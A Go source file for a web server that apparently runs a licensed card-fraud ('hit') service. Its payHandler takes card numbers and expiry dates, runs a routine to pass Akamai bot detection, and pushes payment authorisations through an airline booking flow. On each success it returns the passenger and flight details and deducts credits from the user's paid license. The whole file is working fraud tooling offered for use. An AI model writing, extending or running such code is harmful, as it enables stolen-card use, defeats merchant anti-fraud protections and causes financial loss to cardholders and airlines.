package main

import (
_ "embed"
"encoding/json"
"fmt"
"log"
"net/http"
"strconv"
"strings"
"time"
)

//go:embed index.html
var indexHTML string

//go:embed admin.html
var adminHTML string

func main() {
// Initialise database
if err := initDB("pusa.db"); err != nil {
log.Fatalf("DB init: %v", err)
}
logInfo("Database initialised")

// Load config cache
reloadConfig()
logInfo("Configuration loaded")

// Bootstrap JWT secrets and default admin
initJWTSecrets()
ensureDefaultAdmin()

// ── Routes ────────────────────────────────────────────────────────────────
mux := http.NewServeMux()

// Static pages
mux.HandleFunc("/", indexHandler)
mux.HandleFunc("/admin", adminPageHandler)
mux.HandleFunc("/admin.html", adminPageHandler)

// Auth
mux.HandleFunc("/api/admin/login", adminLoginHandler)
mux.HandleFunc("/api/user/login", userLoginHandler)
mux.HandleFunc("/api/logout", logoutHandler)

// User endpoints (require user or admin JWT)
mux.HandleFunc("/pay", requireAuth("", payHandler))
mux.HandleFunc("/api/user/me", requireAuth("", userMeHandler))

// Admin endpoints (require admin JWT)
mux.HandleFunc("/api/admin/", requireAuth(roleAdmin, adminRouter))

// Bot API endpoints (authenticated via X-Bot-Key header)
mux.HandleFunc("/api/bot/", botAPIRouter)

// Middleware chain: security headers → maintenance → rate limiter → router
handler := secureHeaders(maintenanceMiddleware(rateLimit(requestLogger(mux))))

log.Println("Server listening on :5000")
log.Fatal(http.ListenAndServe(":5000", handler))
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
if r.URL.Path != "/" {
http.NotFound(w, r)
return
}
w.Header().Set("Content-Type", "text/html; charset=utf-8")
fmt.Fprint(w, indexHTML)
}

func adminPageHandler(w http.ResponseWriter, r *http.Request) {
w.Header().Set("Content-Type", "text/html; charset=utf-8")
fmt.Fprint(w, adminHTML)
}

// payResp is the enriched payment response.
type payResp struct {
Success       bool           `json:"success"`
Message       string         `json:"message"`
RecordLocator string         `json:"recordLocator,omitempty"`
PassengerName string         `json:"passengerName,omitempty"`
FlightRoute   string         `json:"flightRoute,omitempty"`
FlightNumber  string         `json:"flightNumber,omitempty"`
BookingStatus string         `json:"bookingStatus,omitempty"`
PaymentStatus string         `json:"paymentStatus,omitempty"`
AuthTime      string         `json:"authTime,omitempty"`
Credits       int            `json:"credits,omitempty"`
}

func payHandler(w http.ResponseWriter, r *http.Request) {
if r.Method != http.MethodPost {
http.NotFound(w, r)
return
}
w.Header().Set("Content-Type", "application/json")
enc := json.NewEncoder(w)

// ── Mode enforcement: check admin config ─────────────────────────────────
mode := r.FormValue("mode")
if mode == "" {
mode = "manual"
}
if mode == "auto" && !getConfigBool("auto_hit_enabled") {
enc.Encode(payResp{false, "Automatic Hit mode is currently disabled by administrator.", "", "", "", "", "", "", "", 0})
return
}
if mode == "manual" && !getConfigBool("manual_hit_enabled") {
enc.Encode(payResp{false, "Manual Hit mode is currently disabled by administrator.", "", "", "", "", "", "", "", 0})
return
}

// ── Credit check ─────────────────────────────────────────────────────────
c := getCtxClaims(r)
var licenseID *int64
if c != nil && c.Role == roleUser && c.LicenseID > 0 {
id := c.LicenseID
licenseID = &id
lic, err := dbGetLicenseByID(id)
if err != nil || lic == nil {
enc.Encode(payResp{Success: false, Message: "License not found"})
return
}
if !lic.Active || lic.Suspended {
enc.Encode(payResp{Success: false, Message: "License is inactive or suspended"})
return
}
if lic.ExpiresAt != nil && time.Now().After(*lic.ExpiresAt) {
enc.Encode(payResp{Success: false, Message: "License has expired"})
return
}
if lic.Credits <= 0 {
enc.Encode(payResp{Success: false, Message: "INSUFFICIENT_CREDITS"})
return
}
}

if err := r.ParseMultipartForm(10 << 20); err != nil {
r.ParseForm()
}

card := strings.ReplaceAll(r.FormValue("card"), " ", "")
xAuthToken := r.FormValue("xAuthToken")
bearerToken := r.FormValue("bearerToken")
hppContent := r.FormValue("hpp")

// ── Card validation ────────────────────────────────────────────────────────
parts := strings.Split(card, "|")
if len(parts) < 3 || len(parts) > 4 {
enc.Encode(payResp{false, "Invalid card format. Use: number|month|year or number|month|year|cvv", "", "", "", "", "", "", "", 0})
return
}
cardNumber, month, year := parts[0], parts[1], parts[2]

if !isDigits(cardNumber) {
enc.Encode(payResp{false, "Card number must be numeric", "", "", "", "", "", "", "", 0})
return
}
isAmex := strings.HasPrefix(cardNumber, "34") || strings.HasPrefix(cardNumber, "37")
expectedLen := 16
if isAmex {
expectedLen = 15
}
if len(cardNumber) != expectedLen {
enc.Encode(payResp{false, fmt.Sprintf("Card number must be %d digits", expectedLen), "", "", "", "", "", "", "", 0})
return
}

if !isDigits(month) {
enc.Encode(payResp{false, "Month must be numeric", "", "", "", "", "", "", "", 0})
return
}
monthInt, _ := strconv.Atoi(month)
if monthInt < 1 || monthInt > 12 {
enc.Encode(payResp{false, "Month must be between 1 and 12", "", "", "", "", "", "", "", 0})
return
}

if !isDigits(year) {
enc.Encode(payResp{false, "Year must be numeric", "", "", "", "", "", "", "", 0})
return
}
var yearInt int
switch len(year) {
case 2:
y, _ := strconv.Atoi(year)
yearInt = 2000 + y
case 4:
yearInt, _ = strconv.Atoi(year)
default:
enc.Encode(payResp{false, "Year must be 2 or 4 digits", "", "", "", "", "", "", "", 0})
return
}

now := time.Now()
if yearInt < now.Year() || (yearInt == now.Year() && monthInt < int(now.Month())) {
enc.Encode(payResp{false, fmt.Sprintf("Card expired (%s/%d)", month, yearInt), "", "", "", "", "", "", "", 0})
return
}

// Mask card for logging
cardMasked := maskCard(cardNumber)

// ── Run Akamai bot challenge (retry once on failure) ──────────────────────
tlsClient, jar, err := runAkamaiChallenge()
if err != nil {
log.Printf("Bot challenge attempt 1 failed: %v — retrying...", err)
tlsClient, jar, err = runAkamaiChallenge()
}
if err != nil {
result := payResp{false, "Bot challenge failed: " + err.Error(), "", "", "", "", "", "", "", 0}
dbLogTransaction(licenseID, cardMasked, "error", "", "", result.Message)
enc.Encode(result)
return
}

// ── Full payment flow ────────────────────────────────────────────────────
ok, msg, itin, err := processManualPayment(tlsClient, jar, xAuthToken, bearerToken, hppContent, cardNumber, month, year)
if err != nil {
result := payResp{false, "Payment error: " + err.Error(), "", "", "", "", "", "", "", 0}
dbLogTransaction(licenseID, cardMasked, "error", "", "", result.Message)
enc.Encode(result)
return
}

log.Printf("payment result | card=%s | ok=%v | msg=%s", cardMasked, ok, msg)

resp := payResp{
Success:       ok,
Message:       msg,
AuthTime:      time.Now().UTC().Format(time.RFC3339),
}

if ok && itin != nil {
resp.RecordLocator = itin.RecordLocator
resp.PassengerName = itin.PassengerName
resp.FlightRoute = itin.FlightRoute
resp.FlightNumber = itin.FlightNumber
resp.BookingStatus = itin.BookingStatus
resp.PaymentStatus = "Authorized"
}

// Deduct credit on success
if ok && licenseID != nil {
newBal, err := dbDeductCredit(*licenseID, "payment_authorized:"+cardMasked)
if err != nil {
logWarn("Credit deduction failed: " + err.Error())
} else {
resp.Credits = newBal
logSuccess(fmt.Sprintf("Credit deducted for license %d, balance=%d", *licenseID, newBal))
}
}

// Log transaction
rl := ""
pn := ""
if itin != nil {
rl = itin.RecordLocator
pn = itin.PassengerName
}
result := "failure"
if ok {
result = "success"
}
dbLogTransaction(licenseID, cardMasked, result, rl, pn, msg)

enc.Encode(resp)
}

// userMeHandler returns the current user's license info and credits.
func userMeHandler(w http.ResponseWriter, r *http.Request) {
w.Header().Set("Content-Type", "application/json")
c := getCtxClaims(r)
if c == nil {
json.NewEncoder(w).Encode(map[string]string{"error": "unauthorized"})
return
}
if c.Role == roleUser && c.LicenseID > 0 {
lic, err := dbGetLicenseByID(c.LicenseID)
if err != nil || lic == nil {
json.NewEncoder(w).Encode(map[string]string{"error": "license not found"})
return
}
json.NewEncoder(w).Encode(map[string]interface{}{
"role":      c.Role,
"credits":   lic.Credits,
"active":    lic.Active,
"suspended": lic.Suspended,
"expiresAt": lic.ExpiresAt,
})
return
}
json.NewEncoder(w).Encode(map[string]interface{}{
"role":     c.Role,
"username": c.Subject,
})
}

func maskCard(cardNumber string) string {
if len(cardNumber) < 4 {
return "****"
}
return "****" + cardNumber[len(cardNumber)-4:]
}

func isDigits(s string) bool {
if len(s) == 0 {
return false
}
for _, c := range s {
if c < '0' || c > '9' {
return false
}
}
return true
}
